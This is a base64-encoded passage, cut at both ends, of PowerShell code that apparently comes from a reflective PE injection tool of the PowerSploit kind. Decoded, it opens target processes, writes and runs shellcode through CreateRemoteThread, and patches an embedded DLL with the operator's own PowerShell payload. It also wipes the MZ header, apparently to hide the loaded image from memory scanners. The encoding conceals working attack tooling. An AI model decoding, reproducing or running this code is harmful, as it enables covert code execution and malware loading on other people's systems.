sICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSkKICAgICAgICAgICAgICAgIGlmICgkUlNDQWRkciAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGZvciBzaGVsbGNvZGUiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCAkU0NQU01lbU9yaWdpbmFsLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQogICAgICAgICAgICAgICAgaWYgKCgkU3VjY2VzcyAtZXEgJGZhbHNlKSAtb3IgKFtVSW50NjRdJE51bUJ5dGVzV3JpdHRlbiAtbmUgW1VJbnQ2NF0kU0NMZW5ndGgpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gd3JpdGUgc2hlbGxjb2RlIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeS4iCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJFJTQ0FkZHIgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucwogICAgICAgICAgICAgICAgJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5XYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkUlRocmVhZEhhbmRsZSwgMjAwMDApCiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCAtbmUgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJvdyAiQ2FsbCB0byBDcmVhdGVSZW1vdGVUaHJlYWQgdG8gY2FsbCBHZXRQcm9jQWRkcmVzcyBmYWlsZWQuIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJFWEUiKQogICAgICAgIHsKICAgICAgICAgICAgI092ZXJ3cml0ZSBHZXRDb21tYW5kTGluZSBhbmQgRXhpdFByb2Nlc3Mgc28gd2UgY2FuIHByb3ZpZGUgb3VyIG93biBhcmd1bWVudHMgdG8gdGhlIEVYRSBhbmQgcHJldmVudCBpdCBmcm9tIGtpbGxpbmcgdGhlIFBTIHByb2Nlc3MKICAgICAgICAgICAgW0ludFB0cl0kRXhlRG9uZUJ5dGVQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoMSkKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6V3JpdGVCeXRlKCRFeGVEb25lQnl0ZVB0ciwgMCwgMHgwMCkKICAgICAgICAgICAgJE92ZXJ3cml0dGVuTWVtSW5mbyA9IFVwZGF0ZS1FeGVGdW5jdGlvbnMgLVBFSW5mbyAkUEVJbmZvIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cyAtRXhlQXJndW1lbnRzICRFeGVBcmdzIC1FeGVEb25lQnl0ZVB0ciAkRXhlRG9uZUJ5dGVQdHIKCiAgICAgICAgICAgICNJZiB0aGlzIGlzIGFuIEVYRSwgY2FsbCB0aGUgZW50cnkgcG9pbnQgaW4gYSBuZXcgdGhyZWFkLiBXZSBoYXZlIG92ZXJ3cml0dGVuIHRoZSBFeGl0UHJvY2VzcyBmdW5jdGlvbiB0byBpbnN0ZWFkIEV4aXRUaHJlYWQKICAgICAgICAgICAgIyAgIFRoaXMgd2F5IHRoZSByZWZsZWN0aXZlbHkgbG9hZGVkIEVYRSB3b24ndCBraWxsIHRoZSBwb3dlcnNoZWxsIHByb2Nlc3Mgd2hlbiBpdCBleGl0cywgaXQgd2lsbCBqdXN0IGtpbGwgaXRzIG93biB0aHJlYWQuCiAgICAgICAgICAgIFtJbnRQdHJdJEV4ZU1haW5QdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSW5mby5QRUhhbmRsZSkgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5BZGRyZXNzT2ZFbnRyeVBvaW50KQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDYWxsIEVYRSBNYWluIGZ1bmN0aW9uLiBBZGRyZXNzOiAkKEdldC1IZXggJEV4ZU1haW5QdHIpLiBDcmVhdGluZyB0aHJlYWQgZm9yIHRoZSBFWEUgdG8gcnVuIGluLiIKCiAgICAgICAgICAgICRXaW4zMkZ1bmN0aW9ucy5DcmVhdGVUaHJlYWQuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCBbSW50UHRyXTo6WmVybywgJEV4ZU1haW5QdHIsIFtJbnRQdHJdOjpaZXJvLCAoW1VJbnQzMl0wKSwgW1JlZl0oW1VJbnQzMl0wKSkgfCBPdXQtTnVsbAoKICAgICAgICAgICAgd2hpbGUoJHRydWUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFtCeXRlXSRUaHJlYWREb25lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVhZEJ5dGUoJEV4ZURvbmVCeXRlUHRyLCAwKQogICAgICAgICAgICAgICAgaWYgKCRUaHJlYWREb25lIC1lcSAxKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENvcHktQXJyYXlPZk1lbUFkZHJlc3NlcyAtQ29weUluZm8gJE92ZXJ3cml0dGVuTWVtSW5mbyAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHMKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFWEUgdGhyZWFkIGhhcyBjb21wbGV0ZWQuIgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBAKCRQRUluZm8uUEVIYW5kbGUsICRFZmZlY3RpdmVQRUhhbmRsZSkKICAgIH0KICAgIAogICAgCiAgICBGdW5jdGlvbiBJbnZva2UtTWVtb3J5RnJlZUxpYnJhcnkKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkUEVIYW5kbGUKICAgICAgICApCiAgICAgICAgCiAgICAgICAgI0dldCBXaW4zMiBjb25zdGFudHMgYW5kIGZ1bmN0aW9ucwogICAgICAgICRXaW4zMkNvbnN0YW50cyA9IEdldC1XaW4zMkNvbnN0YW50cwogICAgICAgICRXaW4zMkZ1bmN0aW9ucyA9IEdldC1XaW4zMkZ1bmN0aW9ucwogICAgICAgICRXaW4zMlR5cGVzID0gR2V0LVdpbjMyVHlwZXMKICAgICAgICAKICAgICAgICAkUEVJbmZvID0gR2V0LVBFRGV0YWlsZWRJbmZvIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cwogICAgICAgIAogICAgICAgICNDYWxsIEZyZWVMaWJyYXJ5IGZvciBhbGwgdGhlIGltcG9ydHMgb2YgdGhlIERMTAogICAgICAgIGlmICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuSW1wb3J0VGFibGUuU2l6ZSAtZ3QgMCkKICAgICAgICB7CiAgICAgICAgICAgIFtJbnRQdHJdJEltcG9ydERlc2NyaXB0b3JQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uUEVIYW5kbGUpIChbSW50NjRdJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkltcG9ydFRhYmxlLlZpcnR1YWxBZGRyZXNzKQogICAgICAgICAgICAKICAgICAgICAgICAgd2hpbGUgKCR0cnVlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSW1wb3J0RGVzY3JpcHRvciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRJbXBvcnREZXNjcmlwdG9yUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9JTVBPUlRfREVTQ1JJUFRPUikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgI0lmIHRoZSBzdHJ1Y3R1cmUgaXMgbnVsbCwgaXQgc2lnbmFscyB0aGF0IHRoaXMgaXMgdGhlIGVuZCBvZiB0aGUgYXJyYXkKICAgICAgICAgICAgICAgIGlmICgkSW1wb3J0RGVzY3JpcHRvci5DaGFyYWN0ZXJpc3RpY3MgLWVxIDAgYAogICAgICAgICAgICAgICAgICAgICAgICAtYW5kICRJbXBvcnREZXNjcmlwdG9yLkZpcnN0VGh1bmsgLWVxIDAgYAogICAgICAgICAgICAgICAgICAgICAgICAtYW5kICRJbXBvcnREZXNjcmlwdG9yLkZvcndhcmRlckNoYWluIC1lcSAwIGAKICAgICAgICAgICAgICAgICAgICAgICAgLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5OYW1lIC1lcSAwIGAKICAgICAgICAgICAgICAgICAgICAgICAgLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5UaW1lRGF0ZVN0YW1wIC1lcSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkRvbmUgdW5sb2FkaW5nIHRoZSBsaWJyYXJpZXMgbmVlZGVkIGJ5IHRoZSBQRSIKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRJbXBvcnREbGxQYXRoID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKChBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uUEVIYW5kbGUpIChbSW50NjRdJEltcG9ydERlc2NyaXB0b3IuTmFtZSkpKQogICAgICAgICAgICAgICAgJEltcG9ydERsbEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRJbXBvcnREbGxQYXRoKQoKICAgICAgICAgICAgICAgIGlmICgkSW1wb3J0RGxsSGFuZGxlIC1lcSAkbnVsbCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJFcnJvciBnZXR0aW5nIERMTCBoYW5kbGUgaW4gTWVtb3J5RnJlZUxpYnJhcnksIERMTE5hbWU6ICRJbXBvcnREbGxQYXRoLiBDb250aW51aW5nIGFueXdheXMiIC1XYXJuaW5nQWN0aW9uIENvbnRpbnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLkZyZWVMaWJyYXJ5Lkludm9rZSgkSW1wb3J0RGxsSGFuZGxlKQogICAgICAgICAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiVW5hYmxlIHRvIGZyZWUgbGlicmFyeTogJEltcG9ydERsbFBhdGguIENvbnRpbnVpbmcgYW55d2F5cy4iIC1XYXJuaW5nQWN0aW9uIENvbnRpbnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRJbXBvcnREZXNjcmlwdG9yUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRJbXBvcnREZXNjcmlwdG9yUHRyKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX0lNUE9SVF9ERVNDUklQVE9SKSkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAjQ2FsbCBEbGxNYWluIHdpdGggcHJvY2VzcyBkZXRhY2gKICAgICAgICBXcml0ZS1WZXJib3NlICJDYWxsaW5nIGRsbG1haW4gc28gdGhlIERMTCBrbm93cyBpdCBpcyBiZWluZyB1bmxvYWRlZCIKICAgICAgICAkRGxsTWFpblB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkFkZHJlc3NPZkVudHJ5UG9pbnQpCiAgICAgICAgJERsbE1haW5EZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgICAgICREbGxNYWluID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJERsbE1haW5QdHIsICREbGxNYWluRGVsZWdhdGUpCiAgICAgICAgCiAgICAgICAgJERsbE1haW4uSW52b2tlKCRQRUluZm8uUEVIYW5kbGUsIDAsIFtJbnRQdHJdOjpaZXJvKSB8IE91dC1OdWxsCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWUuSW52b2tlKCRQRUhhbmRsZSwgW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpCiAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJVbmFibGUgdG8gY2FsbCBWaXJ0dWFsRnJlZSBvbiB0aGUgUEUncyBtZW1vcnkuIENvbnRpbnVpbmcgYW55d2F5cy4iIC1XYXJuaW5nQWN0aW9uIENvbnRpbnVlCiAgICAgICAgfQogICAgfQoKCiAgICBGdW5jdGlvbiBNYWluCiAgICB7CiAgICAgICAgJFdpbjMyRnVuY3Rpb25zID0gR2V0LVdpbjMyRnVuY3Rpb25zCiAgICAgICAgJFdpbjMyVHlwZXMgPSBHZXQtV2luMzJUeXBlcwogICAgICAgICRXaW4zMkNvbnN0YW50cyA9ICBHZXQtV2luMzJDb25zdGFudHMKICAgICAgICAKICAgICAgICAkUmVtb3RlUHJvY0hhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCiAgICAKICAgICAgICAjSWYgYSByZW1vdGUgcHJvY2VzcyB0byBpbmplY3QgaW4gdG8gaXMgc3BlY2lmaWVkLCBnZXQgYSBoYW5kbGUgdG8gaXQKICAgICAgICBpZiAoKCRQcm9jSWQgLW5lICRudWxsKSAtYW5kICgkUHJvY0lkIC1uZSAwKSAtYW5kICgkUHJvY05hbWUgLW5lICRudWxsKSAtYW5kICgkUHJvY05hbWUgLW5lICIiKSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJDYW4ndCBzdXBwbHkgYSBQcm9jSWQgYW5kIFByb2NOYW1lLCBjaG9vc2Ugb25lIG9yIHRoZSBvdGhlciIKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUHJvY05hbWUgLW5lICRudWxsIC1hbmQgJFByb2NOYW1lIC1uZSAiIikKICAgICAgICB7CiAgICAgICAgICAgICRQcm9jZXNzZXMgPSBAKEdldC1Qcm9jZXNzIC1OYW1lICRQcm9jTmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkKICAgICAgICAgICAgaWYgKCRQcm9jZXNzZXMuQ291bnQgLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDYW4ndCBmaW5kIHByb2Nlc3MgJFByb2NOYW1lIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJFByb2Nlc3Nlcy5Db3VudCAtZ3QgMSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFByb2NJbmZvID0gR2V0LVByb2Nlc3MgfCB3aGVyZSB7ICRfLk5hbWUgLWVxICRQcm9jTmFtZSB9IHwgU2VsZWN0LU9iamVjdCBQcm9jZXNzTmFtZSwgSWQsIFNlc3Npb25JZAogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRQcm9jSW5mbwogICAgICAgICAgICAgICAgVGhyb3cgIk1vcmUgdGhhbiBvbmUgaW5zdGFuY2Ugb2YgJFByb2NOYW1lIGZvdW5kLCBwbGVhc2Ugc3BlY2lmeSB0aGUgcHJvY2VzcyBJRCB0byBpbmplY3QgaW4gdG8uIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFByb2NJZCA9ICRQcm9jZXNzZXNbMF0uSUQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAjSnVzdCByZWFsaXplZCB0aGF0IFBvd2VyU2hlbGwgbGF1bmNoZXMgd2l0aCBTZURlYnVnUHJpdmlsZWdlIGZvciBzb21lIHJlYXNvbi4uIFNvIHRoaXMgaXNuJ3QgbmVlZGVkLiBLZWVwaW5nIGl0IGFyb3VuZCBqdXN0IGluY2FzZSBpdCBpcyBuZWVkZWQgaW4gdGhlIGZ1dHVyZS4KICAgICAgICAjSWYgdGhlIHNjcmlwdCBpc24ndCBydW5uaW5nIGluIHRoZSBzYW1lIFdpbmRvd3MgbG9nb24gc2Vzc2lvbiBhcyB0aGUgdGFyZ2V0LCBnZXQgU2VEZWJ1Z1ByaXZpbGVnZQojICAgICAgIGlmICgoR2V0LVByb2Nlc3MgLUlkICRQSUQpLlNlc3Npb25JZCAtbmUgKEdldC1Qcm9jZXNzIC1JZCAkUHJvY0lkKS5TZXNzaW9uSWQpCiMgICAgICAgewojICAgICAgICAgICBXcml0ZS1WZXJib3NlICJHZXR0aW5nIFNlRGVidWdQcml2aWxlZ2UiCiMgICAgICAgICAgIEVuYWJsZS1TZURlYnVnUHJpdmlsZWdlIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cwojICAgICAgIH0gICAKICAgICAgICAKICAgICAgICBpZiAoKCRQcm9jSWQgLW5lICRudWxsKSAtYW5kICgkUHJvY0lkIC1uZSAwKSkKICAgICAgICB7CiAgICAgICAgICAgICRSZW1vdGVQcm9jSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLk9wZW5Qcm9jZXNzLkludm9rZSgweDAwMUYwRkZGLCAkZmFsc2UsICRQcm9jSWQpCiAgICAgICAgICAgIGlmICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDb3VsZG4ndCBvYnRhaW4gdGhlIGhhbmRsZSBmb3IgcHJvY2VzcyBJRDogJFByb2NJZCIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiR290IHRoZSBoYW5kbGUgZm9yIHRoZSByZW1vdGUgcHJvY2VzcyB0byBpbmplY3QgaW4gdG8iCiAgICAgICAgfQogICAgICAgIAoKICAgICAgICAjTG9hZCB0aGUgUEUgcmVmbGVjdGl2ZWx5CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2FsbGluZyBJbnZva2UtTWVtb3J5TG9hZExpYnJhcnkiCiAgICAgICAgCiAgICAgICAgI0RldGVybWluZSB3aGV0aGVyIG9yIG5vdCB0byB1c2UgMzJiaXQgb3IgNjRiaXQgYnl0ZXMKICAgICAgICBpZiAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtZXEgOCkKICAgICAgICB7CiAgICAgICAgICAgIFtCeXRlW11dJFJhd0J5dGVzID0gW0J5dGVbXV1bQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJFBFQnl0ZXM2NCkKICAgICAgICAgICAgd3JpdGUtdmVyYm9zZSAiNjQgQml0IEluamVjdGlvbiIKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0kUmF3Qnl0ZXMgPSBbQnl0ZVtdXVtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkUEVCeXRlczMyKQogICAgICAgICAgICB3cml0ZS12ZXJib3NlICIzMiBCaXQgSW5qZWN0aW9uIgogICAgICAgIH0KICAgICAgICAjUkVQTEFDSU5HIFRIRSBDQUxMQkFDSyBCWVRFUyBXSVRIIFlPVVIgT1dOCiAgICAgICAgIyMjIyMjIyMjIyMjIyMKICAgICAgICAKICAgICAgICAjIHBhdGNoIGluIHRoZSBjb2RlIGJ5dGVzCiAgICAgICAgJFJhd0J5dGVzID0gSW52b2tlLVBhdGNoRGxsIC1EbGxCeXRlcyAkUmF3Qnl0ZXMgLUZpbmRTdHJpbmcgIkludm9rZS1SZXBsYWNlIiAtUmVwbGFjZVN0cmluZyAkUG9zaENvZGUKICAgICAgICAkUEVCeXRlcyA9ICRSYXdCeXRlcwogICAgICAgIAogICAgICAgICNyZXBsYWNlIHRoZSBNWiBIZWFkZXIKICAgICAgICAkUEVCeXRlc1swXSA9IDAKICAgICAgICAkUEVCeXRlc1sxXSA9IDAKICAgICAgICAkUEVIYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgIGlmICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICAkUEVMb2FkZWRJbmZvID0gSW52b2tlLU1lbW9yeUxvYWRMaWJyYXJ5IC1QRUJ5dGVzICRQRUJ5dGVzIC1FeGVBcmdzICRFeGVBcmdzIC1Gb3JjZUFTTFIgJEZvcmNlQVNMUgogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkUEVMb2FkZWRJbmZvID0gSW52b2tlLU1lbW9yeUxvYWRMaWJyYXJ5IC1QRUJ5dGVzICRQRUJ5dGVzIC1FeGVBcmdzICRFeGVBcmdzIC1SZW1vdGVQcm9jSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1Gb3JjZUFTTFIgJEZvcmNlQVNMUgogICAgICAgIH0KICAgICAgICBpZiAoJFBFTG9hZGVkSW5mbyAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGxvYWQgUEUsIGhhbmRsZSByZXR1cm5lZCBpcyBOVUxMIgogICAgICAgIH0KICAgICAgICAKICAgICAgICAkUEVIYW5kbGUgPSAkUEVMb2FkZWRJbmZvWzBdCiAgICAgICAgJFJlbW90ZVBFSGFuZGxlID0gJFBFTG9hZGVkSW5mb1sxXSAjb25seSBtYXR0ZXJzIGlmIHlvdSBsb2FkZWQgaW4gdG8gYSByZW1vdGUgcHJvY2VzcwogICAgICAgIAogICAgICAgIAogICAgICAgICNDaGVjayBpZiBFWEUgb3IgRExMLiBJZiBFWEUsIHRoZSBlbnRyeSBwb2ludCB3YXMgYWxyZWFkeSBjYWxsZWQgYW5kIHdlIGNhbiBub3cgcmV0dXJuLiBJZiBETEwsIGNhbGwgdXNlciBmdW5jdGlvbi4KICAgICAgICAkUEVJbmZvID0gR2V0LVBFRGV0YWlsZWRJbmZvIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cwogICAgICAgIGlmICgoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJETEwiKSAtYW5kICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pKQogICAgICAgIHsKICAgICAgICAgICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICAgICAgICAgIyMjIFlPVVIgQ09ERSBHT0VTIEhFUkUKICAgICAgICAgICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICAgICAgICAgc3dpdGNoICgkRnVuY1JldHVyblR5cGUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICdXU3RyaW5nJyB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2FsbGluZyBmdW5jdGlvbiB3aXRoIFdTdHJpbmcgcmV0dXJuIHR5cGUiCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kV1N0cmluZ0Z1bmNBZGRyID0gR2V0LU1lbW9yeVByb2NBZGRyZXNzIC1QRUhhbmRsZSAkUEVIYW5kbGUgLUZ1bmN0aW9uTmFtZSAiV1N0cmluZ0Z1bmMiCiAgICAgICAgICAgICAgICAgICAgaWYgKCRXU3RyaW5nRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgVGhyb3cgIkNvdWxkbid0IGZpbmQgZnVuY3Rpb24gYWRkcmVzcy4iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRXU3RyaW5nRnVuY0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKCkgKFtJbnRQdHJdKQogICAgICAgICAgICAgICAgICAgICRXU3RyaW5nRnVuYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXU3RyaW5nRnVuY0FkZHIsICRXU3RyaW5nRnVuY0RlbGVnYXRlKQogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJE91dHB1dFB0ciA9ICRXU3RyaW5nRnVuYy5JbnZva2UoKQogICAgICAgICAgICAgICAgICAgICRPdXRwdXQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ1VuaSgkT3V0cHV0UHRyKQogICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkT3V0cHV0CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJ1N0cmluZycgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgZnVuY3Rpb24gd2l0aCBTdHJpbmcgcmV0dXJuIHR5cGUiCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kU3RyaW5nRnVuY0FkZHIgPSBHZXQtTWVtb3J5UHJvY0FkZHJlc3MgLVBFSGFuZGxlICRQRUhhbmRsZSAtRnVuY3Rpb25OYW1lICJTdHJpbmdGdW5jIgogICAgICAgICAgICAgICAgICAgIGlmICgkU3RyaW5nRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgVGhyb3cgIkNvdWxkbid0IGZpbmQgZnVuY3Rpb24gYWRkcmVzcy4iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRTdHJpbmdGdW5jRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoKSAoW0ludFB0cl0pCiAgICAgICAgICAgICAgICAgICAgJFN0cmluZ0Z1bmMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdO